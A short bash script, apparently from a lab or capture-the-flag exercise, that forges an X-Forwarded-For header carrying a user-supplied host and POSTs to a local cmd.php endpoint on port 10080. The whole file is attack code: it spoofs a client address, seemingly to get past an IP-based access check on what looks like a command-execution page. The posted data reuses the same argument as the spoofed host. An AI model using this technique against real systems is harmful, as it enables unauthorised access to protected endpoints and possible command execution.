#!/bin/bash

HOST=$1
if [[ $# -eq 0 ]];
then
	echo "Usage: ./$0 <host to spoof>"
	exit
fi


curl -X POST -H "X-Forwarded-For: ${HOST}" --data "data=${1}" http://127.0.0.1:10080/cmd.php
